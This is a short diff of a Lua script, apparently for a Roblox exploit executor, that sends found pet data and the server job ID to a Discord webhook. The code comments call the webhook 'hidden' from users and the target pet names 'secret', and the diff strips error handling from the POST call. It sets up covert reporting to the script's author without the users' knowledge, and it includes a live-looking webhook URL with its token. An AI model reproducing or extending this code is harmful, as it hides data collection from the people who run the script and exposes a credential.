@@ -1,5 +1,5 @@
 -- Hidden config for your secret webhook and pet names (users won't see this)
-local hiddenWebhook = "https://canary.discord.com/api/webhooks/1413487568334491688/VSMhmL61QW9S2ogHZHun6Usreup1SLcVj3akifS8JpG6G2XeTJV5JKORI8qdfNfrQJOh" -- Replace with your actual secret webhook
+local hiddenWebhook = "https://canary.discord.com/api/webhooks/1413487568334491688/VSMhmL61QW9S2ogHZHun6Usreup1SLcVj3akifS8JpG6G2XeTJV5JKORI8qdfNfrQJOh"
 local hiddenTargetPetNames = {
     "Noobini Pizzanini", "Lirili Larila" -- Your secret pet names
 }
@@ -80,7 +80,7 @@ local function sendWebhook(foundPets, jobId)
     local jsonData = HttpService:JSONEncode(embedData)
     local req = http_request or request or (syn and syn.request)
     if req then
-        local success, err = pcall(function()
+        pcall(function()
             req({
                 Url = hiddenWebhook,
                 Method = "POST",
